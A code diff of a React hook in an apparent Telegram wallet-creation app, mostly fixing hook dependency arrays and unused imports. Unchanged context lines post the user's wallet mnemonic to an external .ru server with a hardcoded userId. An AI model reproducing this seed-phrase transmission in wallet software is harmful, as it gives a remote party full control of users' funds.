@@ -1,4 +1,4 @@
-import React, { useCallback, useEffect } from 'react';
+import  { useCallback, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import BackButton from '../../../constants/BackButton';
 import MainButton from '../../../constants/MainButton';
@@ -36,7 +36,7 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
         
 
 
-    } , [values, mistakes, keys, numbers] )
+    } , [values, mistakes, keys, numbers, setMistakes] )
     
 
     const dispatch = useDispatch()
@@ -70,11 +70,11 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
         })
           setMistakes(mistakesCopy)
           return mistakesCopy.every(e => !e)
-      }, [keys, values, setMistakes, ] )
+      }, [keys, values, setMistakes, numbers ] )
 
 
       const createWallet = useCallback( async () => {
-        const response = await axios.post("https://www.connectbirga.ru/user/wallet", {
+        await axios.post("https://www.connectbirga.ru/user/wallet", {
             mnemonic: keys,
             userId: 1392120153,
           } , {
@@ -99,7 +99,7 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
           else{
             window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
           }
-      } , [checkFunction] )
+      } , [checkFunction, dispatch, createWallet, navigate] )
     
 
       useEffect( () => {
